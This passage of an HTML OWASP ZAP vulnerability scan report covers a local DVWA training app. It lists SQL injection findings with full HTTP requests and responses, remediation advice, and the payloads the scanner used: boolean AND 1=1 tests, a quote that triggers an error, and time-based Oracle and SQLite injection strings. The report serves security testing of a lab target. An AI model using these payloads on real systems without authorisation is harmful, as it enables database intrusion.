+<p>Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.</p>
+
+<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
+
+<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</p>
+
+<p>When constructing OS command strings, use stringent allow lists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</p>
+
+<p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</p>
+
+<p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-5">SQL Injection</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">POST https://localhost/DVWA/vulnerabilities/xss_s/</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">WSTG-v42-INPV-05</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>SQL injection may be possible.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>The page results were successfully manipulated using the boolean conditions [AjrldUItIZftVuTWVgLHQgZEsveqjqfhgzmWFaPq AND 1=1] and [AjrldUItIZftVuTWVgLHQgZEsveqjqfhgzmWFaPq AND 1=2]</p>
+
+<p>The parameter value being modified was stripped from the HTML output for the purposes of the comparison</p>
+
+<p>Data was returned for the original parameter.</p>
+
+<p>The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (673 bytes)</summary>
+				
+				<pre><code>POST https://localhost/DVWA/vulnerabilities/xss_s/ HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/xss_s/
+Content-Type: application/x-www-form-urlencoded
+content-length: 103
+Origin: https://localhost
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: security=medium; PHPSESSID=cd19ph407vbq0llvn192u9o5g3
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (103 bytes)</summary>
+				
+				<pre><code>txtName=RJwUgoZYfv&amp;mtxMessage=AjrldUItIZftVuTWVgLHQgZEsveqjqfhgzmWFaPq+AND+1%3D1&amp;btnSign=Sign+Guestbook</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (355 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 06:35:52 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4319
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body">
+				<summary>Response body (4319 bytes)</summary>
+				
+				<pre><code>&lt;!DOCTYPE html&gt;
+
+&lt;html lang="en-GB"&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+
+		&lt;title&gt;Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA)&lt;/title&gt;
+
+		&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;
+
+		&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;
+
+		&lt;script type="text/javascript" src="../../dvwa/js/dvwaPage.js"&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class="home"&gt;
+		&lt;div id="container"&gt;
+
+			&lt;div id="header"&gt;
+
+				&lt;img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id="main_menu"&gt;
+
+				&lt;div id="main_menu_padded"&gt;
+				&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../."&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../instructions.php"&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../setup.php"&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../vulnerabilities/brute/"&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/exec/"&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/csrf/"&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/fi/.?page=include.php"&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/upload/"&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/captcha/"&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/sqli/"&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/sqli_blind/"&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/weak_id/"&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_d/"&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_r/"&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class="selected"&gt;&lt;a href="../../vulnerabilities/xss_s/"&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/csp/"&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/javascript/"&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/authbypass/"&gt;Authorisation Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/open_redirect/"&gt;Open HTTP Redirect&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../security.php"&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../phpinfo.php"&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../about.php"&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../logout.php"&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id="main_body"&gt;
+
+				
+&lt;div class="body_padded"&gt;
+	&lt;h1&gt;Vulnerability: Stored Cross Site Scripting (XSS)&lt;/h1&gt;
+
+	&lt;div class="vulnerable_code_area"&gt;
+		&lt;form method="post" name="guestform" "&gt;
+			&lt;table width="550" border="0" cellpadding="2" cellspacing="1"&gt;
+				&lt;tr&gt;
+					&lt;td width="100"&gt;Name *&lt;/td&gt;
+					&lt;td&gt;&lt;input name="txtName" type="text" size="30" maxlength="10"&gt;&lt;/td&gt;
+				&lt;/tr&gt;
+				&lt;tr&gt;
+					&lt;td width="100"&gt;Message *&lt;/td&gt;
+					&lt;td&gt;&lt;textarea name="mtxMessage" cols="50" rows="3" maxlength="50"&gt;&lt;/textarea&gt;&lt;/td&gt;
+				&lt;/tr&gt;
+				&lt;tr&gt;
+					&lt;td width="100"&gt;&amp;nbsp;&lt;/td&gt;
+					&lt;td&gt;
+						&lt;input name="btnSign" type="submit" value="Sign Guestbook" onclick="return validateGuestbookForm(this.form);" /&gt;
+						&lt;input name="btnClear" type="submit" value="Clear Guestbook" onClick="return confirmClearGuestbook();" /&gt;
+					&lt;/td&gt;
+				&lt;/tr&gt;
+			&lt;/table&gt;
+
+		&lt;/form&gt;
+		
+	&lt;/div&gt;
+	&lt;br /&gt;
+
+	&lt;div id="guestbook_comments"&gt;Name: RJwUgoZYfv&lt;br /&gt;Message: AjrldUItIZftVuTWVgLHQgZEsveqjqfhgzmWFaPq AND 1=1&lt;br /&gt;&lt;/div&gt;
+
+	&lt;br /&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class="clear"&gt;
+			&lt;/div&gt;
+
+			&lt;div id="system_info"&gt;
+				&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_s&amp;security=medium&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=xss_s&amp;security=medium' )"&gt; &lt;div align="left"&gt;&lt;em&gt;Username:&lt;/em&gt; admin&lt;br /&gt;&lt;em&gt;Security Level:&lt;/em&gt; medium&lt;br /&gt;&lt;em&gt;Locale:&lt;/em&gt; en&lt;br /&gt;&lt;em&gt;SQLi DB:&lt;/em&gt; mysql&lt;/div&gt;
+			&lt;/div&gt;
+
+			&lt;div id="footer"&gt;
+
+				&lt;p&gt;Damn Vulnerable Web Application (DVWA)&lt;/p&gt;
+				&lt;script src='../../dvwa/js/add_event_listeners.js'&gt;&lt;/script&gt;
+
+			&lt;/div&gt;
+
+		&lt;/div&gt;
+
+	&lt;/body&gt;
+
+&lt;/html&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>mtxMessage</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>AjrldUItIZftVuTWVgLHQgZEsveqjqfhgzmWFaPq AND 1=1</code></pre></td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Do not trust client side input, even if there is client side validation in place.</p>
+
+<p>In general, type check all data on the server side.</p>
+
+<p>If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</p>
+
+<p>If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</p>
+
+<p>If database Stored Procedures can be used, use them.</p>
+
+<p>Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</p>
+
+<p>Do not create dynamic SQL queries using simple string concatenation.</p>
+
+<p>Escape all data received from the client.</p>
+
+<p>Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.</p>
+
+<p>Apply the principle of least privilege by using the least privileged database user possible.</p>
+
+<p>In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</p>
+
+<p>Grant the minimum database access that is necessary for the application.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-6">SQL Injection - MySQL</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">WSTG-v42-INPV-05</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>SQL injection may be possible.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>RDBMS [MySQL] likely, given error message regular expression [\QYou have an error in your SQL syntax\E] matched by the HTML results.</p>
+
+<p>The vulnerability was detected by manipulating the parameter to cause a database error message to be returned and recognised</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (562 bytes)</summary>
+				
+				<pre><code>POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/authbypass/
+Content-Type: application/json
+content-length: 75
+Origin: https://localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Cookie: security=medium; PHPSESSID=cd19ph407vbq0llvn192u9o5g3
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (75 bytes)</summary>
+				
+				<pre><code>{"id":"'","first_name":"&lt;HMfiHzUuFEwfzUgd","surname":"ï¿½aOoKTpgYlWBpkCtt"}</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (364 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 06:12:01 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 160
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (160 bytes)</summary>
+				
+				<pre><code>&lt;pre&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1&lt;/pre&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>id</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>'</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>You have an error in your SQL syntax</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Do not trust client side input, even if there is client side validation in place.</p>
+
+<p>In general, type check all data on the server side.</p>
+
+<p>If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</p>
+
+<p>If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</p>
+
+<p>If database Stored Procedures can be used, use them.</p>
+
+<p>Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</p>
+
+<p>Do not create dynamic SQL queries using simple string concatenation.</p>
+
+<p>Escape all data received from the client.</p>
+
+<p>Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.</p>
+
+<p>Apply the principle of least privilege by using the least privileged database user possible.</p>
+
+<p>In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</p>
+
+<p>Grant the minimum database access that is necessary for the application.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-7">SQL Injection - Oracle - Time Based</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">WSTG-v42-INPV-05</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>SQL injection may be possible.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>The query time is controllable using parameter value [PabloMCcrDQBmsjnbNRdzceRLvziv' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / '], which caused the request to take [5,812] milliseconds, when the original unmodified query with value [PabloMCcrDQBmsjnbNRdzceRLvziv] took [41] milliseconds </p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (563 bytes)</summary>
+				
+				<pre><code>POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/authbypass/
+Content-Type: application/json
+content-length: 405
+Origin: https://localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Cookie: security=medium; PHPSESSID=u3h6924k97ai1jrmjgn1s4cqui
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (405 bytes)</summary>
+				
+				<pre><code>{"id":4,"first_name":"PabloMCcrDQBmsjnbNRdzceRLvziv' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / '","surname":"PicassokovFMPHEnmPateUmQmxLAuSs"}</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (363 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 08:22:32 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 59
+Keep-Alive: timeout=5, max=97
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (59 bytes)</summary>
+				
+				<pre><code>&lt;pre&gt;FUNCTION utl_inaddr.get_host_name does not exist&lt;/pre&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>first_name</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>field: [first_name], value [PabloMCcrDQBmsjnbNRdzceRLvziv' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / ']</code></pre></td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Do not trust client side input, even if there is client side validation in place.</p>
+
+<p>In general, type check all data on the server side.</p>
+
+<p>If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</p>
+
+<p>If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</p>
+
+<p>If database Stored Procedures can be used, use them.</p>
+
+<p>Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</p>
+
+<p>Do not create dynamic SQL queries using simple string concatenation.</p>
+
+<p>Escape all data received from the client.</p>
+
+<p>Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.</p>
+
+<p>Apply the principle of least privilege by using the least privileged database user possible.</p>
+
+<p>In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</p>
+
+<p>Grant the minimum database access that is necessary for the application.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-8">SQL Injection - SQLite</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">WSTG-v42-INPV-05</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>SQL injection may be possible.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>The query time is controllable using parameter value [case randomblob(100000) when not null then 1 else 1 end ], which caused the request to take [17] milliseconds, parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [914] milliseconds, when the original unmodified query with value [2] took [7] milliseconds.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (563 bytes)</summary>
+				
+				<pre><code>POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/authbypass/
+Content-Type: application/json
+content-length: 137
+Origin: https://localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Cookie: security=medium; PHPSESSID=u3h6924k97ai1jrmjgn1s4cqui
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (137 bytes)</summary>
+				
+				<pre><code>{"id":"case randomblob(100000) when not null then 1 else 1 end ","first_name":"GordonxqxJLdYuxqxJLdYu","surname":"BrownnOjbTKDFnOjbTKDF"}</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (364 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 08:44:55 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 50
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (50 bytes)</summary>
+				
+				<pre><code>&lt;pre&gt;FUNCTION dvwa.randomblob does not exist&lt;/pre&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>id</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>case randomblob(100000) when not null then 1 else 1 end </code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>The query time is controllable using parameter value [case randomblob(100000) when not null then 1 else 1 end ], which caused the request to take [17] milliseconds, parameter value [case randomblob(1000000) when not null then 1 else 1 end ], which caused the request to take [914] milliseconds, when the original unmodified query with value [2] took [7] milliseconds.</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Do not trust client side input, even if there is client side validation in place.</p>
+
+<p>In general, type check all data on the server side.</p>
+
+<p>If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</p>
+
+<p>If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</p>
+
+<p>If database Stored Procedures can be used, use them.</p>
+
+<p>Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</p>
+
+<p>Do not create dynamic SQL queries using simple string concatenation.</p>
+
+<p>Escape all data received from the client.</p>
+
+<p>Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.</p>
+
+<p>Apply the principle of least privilege by using the least privileged database user possible.</p>
+
+<p>In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</p>
+
+<p>Grant the minimum database access that is necessary for the application.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+							</ol>
+						</li>
+						
+					</ol>
+				</li>
+				  
+				 
+				
+				
+				
+				
+				<li id="alerts--risk-2-confidence-2">
+					<h3>
+						<span>Risk</span>=<span class="risk-level">Medium</span>, <span>Confidence</span>=<span class="confidence-level">Medium</span> <span>(3)</span>
+					</h3>
+					<ol>
+						
+						<li class="alerts--site-li">
+							<h4>
+								<span class="site">https://localhost</span> <span>(3)</span>
+							</h4>
